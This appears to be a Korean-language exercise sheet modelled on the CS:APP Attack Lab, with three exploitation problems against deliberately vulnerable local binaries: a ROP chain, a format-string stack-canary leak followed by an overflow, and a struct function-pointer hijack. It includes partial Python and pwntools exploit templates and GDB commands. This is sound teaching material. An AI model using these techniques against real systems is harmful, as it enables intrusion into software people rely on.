# CS:APP Chapter 3 — Advanced System Hacking 연습문제

> **선수 조건**: 기초 3문제 (buffer overflow, 어셈블리 역산, return address overwrite) 완료
> **필요 도구**: GCC, GDB, objdump, ROPgadget (선택)
> **컴파일 환경**: Linux x86-64

---

## 문제 개요

| # | 유형 | 핵심 개념 | 난이도 |
|---|------|-----------|--------|
| 1 | ROP Exploit | ROP gadget chaining, calling convention | ★★★★☆ |
| 2 | 2-Stage Exploit | Format string leak + canary bypass | ★★★★★ |
| 3 | Data-only Exploit | Struct layout, function pointer hijack | ★★★☆☆ |

> 추천 풀이 순서: **3 → 1 → 2** (난이도 순)

---

## Problem 1: ROP Chain — Gadget Chaining

**파일**: `adv1_rop.c`

```
gcc -O1 -fno-stack-protector -no-pie -o adv1 adv1_rop.c
```

### 배경

이전 문제에서는 return address를 `secret_func` 주소로 바꾸기만 하면 됐다.
하지만 이번에는 **인자 2개를 정확히 세팅**한 뒤 `win()`을 호출해야 한다.

x86-64의 **calling convention (호출 규약)**에서:
- 첫 번째 인자 → `%rdi`
- 두 번째 인자 → `%rsi`

스택에서 직접 코드를 실행할 수 없으므로 (NX bit),
바이너리에 이미 존재하는 짧은 코드 조각 = **gadget (가젯)**을 연결해서
레지스터를 세팅해야 한다.

### ROP의 핵심 원리

`ret` 명령어는 `pop %rip` 와 동일하다.
스택에 주소를 순서대로 쌓아두면, 각 `ret`이 다음 가젯으로 점프한다:

```
┌─────────────────────┐ ← buf 시작
│   padding (쓰레기)    │
├─────────────────────┤ ← return address 위치
│ gadget1: pop rdi;ret│ ─→ rdi에 값을 넣고 다음 주소로 ret
├─────────────────────┤
│      0xDEAD         │ ─→ pop rdi가 이 값을 가져감
├─────────────────────┤
│ gadget2: pop rsi;ret│ ─→ rsi에 값을 넣고 다음 주소로 ret
├─────────────────────┤
│      0xBEEF         │ ─→ pop rsi가 이 값을 가져감
├─────────────────────┤
│   win() 주소         │ ─→ 최종 목적지
└─────────────────────┘
```

### 과제

**(A) 가젯 찾기**

```bash
objdump -d adv1 | grep -A1 "pop.*rdi"
objdump -d adv1 | grep -A1 "pop.*rsi"
```

또는 ROPgadget 도구 사용:
```bash
ROPgadget --binary adv1 | grep "pop rdi"
```

**(B) 주소 수집** — 아래 항목의 주소를 모두 기록하라:
1. `pop rdi; ret` 가젯
2. `pop rsi; ret` 가젯
3. `win()` 함수

**(C) Payload 구성** — ROP chain을 완성하라:

```python
import sys
import struct

def p64(addr):
    return addr.to_bytes(8, 'little')

offset    = ???   # buf ~ return address
pop_rdi   = ???   # pop rdi; ret 가젯 주소
pop_rsi   = ???   # pop rsi; ret 가젯 주소
win_addr  = ???   # win() 주소

payload  = b'A' * offset
payload += p64(pop_rdi)
payload += p64(0xDEAD)
payload += p64(pop_rsi)
payload += p64(0xBEEF)
payload += p64(win_addr)

sys.stdout.buffer.write(payload)
```

---

## Problem 2: Canary Leak — Format String + Buffer Overflow

**파일**: `adv2_canary.c`

```
gcc -O1 -no-pie -o adv2 adv2_canary.c
```

> **주의**: `-fno-stack-protector`를 붙이지 **않는다**! Canary가 활성화된 상태로 공략해야 한다.

### 배경

**Stack canary (스택 카나리)**는 return address 바로 앞에 놓이는 랜덤 값이다.
함수가 리턴하기 전에 이 값이 변조됐는지 검사하여, 변조되었으면 프로그램을 종료한다.

```
┌──────────────┐ ← buf 시작
│    buf[32]   │
├──────────────┤
│   CANARY     │ ← 이 값을 모르면 overflow 시 탐지됨
├──────────────┤
│  saved %rbp  │
├──────────────┤
│ return addr  │
└──────────────┘
```

하지만 이 프로그램에는 **format string vulnerability (포맷 스트링 취약점)**이 있다.
`printf(name)` 처럼 사용자 입력을 format string으로 직접 사용하면,
스택의 내용을 읽어올 수 있다.

### 과제

**(A) Phase 1 — Canary Leak**

1. `echo()` 함수에서 `printf(name)`이 왜 위험한지 설명하라.
   `printf("%lx.%lx.%lx.%lx")` 를 입력하면 무엇이 출력되는가?

2. 출력된 값들 중 canary를 식별하라.
   Canary의 특징: **하위 1바이트가 항상 `\x00` (null byte)**이다.

3. GDB에서 `echo()`의 canary 위치를 확인하여 검증하라:
   ```
   (gdb) break echo
   (gdb) run
   (gdb) x/20gx $rsp
   ```

**(B) Phase 2 — Canary-Aware Overflow**

Leak한 canary 값을 **정확한 위치에 다시 넣으면서** overflow하라:

```
payload = [buf 패딩] + [canary] + [saved rbp 패딩] + [secret() 주소]
```

**(C) 자동화** — 두 단계를 하나의 스크립트로 연결하라:

```python
from pwn import *    # pwntools 라이브러리

p = process('./adv2')

# Phase 1: canary leak
p.sendlineafter(b'name? ', b'%7$lx')   # offset은 직접 찾을 것
canary = int(p.recvline().strip(), 16)
print(f"Leaked canary: {hex(canary)}")

# Phase 2: overflow with canary
payload  = b'A' * ???           # buf 크기
payload += p64(canary)          # canary 복원
payload += b'B' * 8             # saved rbp
payload += p64(???)             # secret() 주소

p.sendlineafter(b'message: ', payload)
p.interactive()
```

> pwntools가 없으면 `pip install pwntools`로 설치.
> 설치가 어려우면 subprocess + 수동 파싱으로도 가능하다.

---

## Problem 3: Struct Smash — Function Pointer Hijack

**파일**: `adv3_struct.c`

```
gcc -O1 -fno-stack-protector -no-pie -o adv3 adv3_struct.c
```

### 배경

이 문제는 **return address를 건드리지 않는다**.
대신 struct의 메모리 배치를 이용하여 **function pointer (함수 포인터)**를 덮어쓴다.

CS:APP 3.9절의 struct alignment (구조체 정렬) 개념이 핵심이다.

### 과제

**(A) 메모리 레이아웃 분석**

`struct User`의 각 필드가 메모리에 어떻게 배치되는지 그려라:

```c
struct User {
    char name[24];       // offset: 0,  size: 24
    int privilege;       // offset: ?,  size: 4
    action_fn action;    // offset: ?,  size: 8 (함수 포인터)
};
```

1. `int privilege`의 offset은? alignment padding이 필요한가?
2. `action_fn action`의 offset은? padding은?
3. `sizeof(struct User)` 는 총 몇 바이트인가?

GDB로 검증:
```
(gdb) print sizeof(struct User)
(gdb) print &user.name
(gdb) print &user.privilege
(gdb) print &user.action
```

**(B) Exploit 설계**

`gets(user.name)` 으로 `name[24]` 를 넘어서 쓰면,
바로 뒤에 있는 `privilege`와 `action`을 덮어쓸 수 있다.

Payload 구조:
```
[name 24바이트] + [privilege 덮어쓰기] + [padding?] + [admin_panel 주소]
```

주의할 점:
- `privilege`는 `int` (4바이트) 이다
- `action`은 포인터 (8바이트) 이고, 8바이트 alignment를 요구한다
- 그 사이에 **padding (패딩)**이 있을 수 있다!

**(C) 실행** — admin_panel()이 호출되도록 payload를 구성하라.

---

## 필수 도구 정리

| 도구 | 용도 | 설치 |
|------|------|------|
| GDB | 디버깅, 메모리 검사 | 기본 설치됨 |
| objdump | 디스어셈블, 주소 확인 | 기본 설치됨 |
| ROPgadget | ROP 가젯 자동 검색 | `pip install ROPgadget` |
| pwntools | exploit 자동화 | `pip install pwntools` |

## Canary 식별 팁

```
(gdb) canary                     # GEF/pwndbg 플러그인이 있을 때
(gdb) x/gx $fs_base + 0x28      # 수동으로 canary 값 확인
```

Canary의 특성:
- 프로그램 실행마다 **랜덤**으로 바뀜
- 하위 1바이트는 항상 **0x00** (null terminator 역할)

---

## 참고 자료

- CS:APP 3rd Edition, Section 3.7.2: Transferring Control (call/ret)
- CS:APP 3rd Edition, Section 3.9: Heterogeneous Data Structures (struct layout)
- CS:APP 3rd Edition, Section 3.10.3-4: Buffer Overflow & Thwarting Attacks
- CS:APP Attack Lab (http://csapp.cs.cmu.edu/3e/attacklab.pdf)
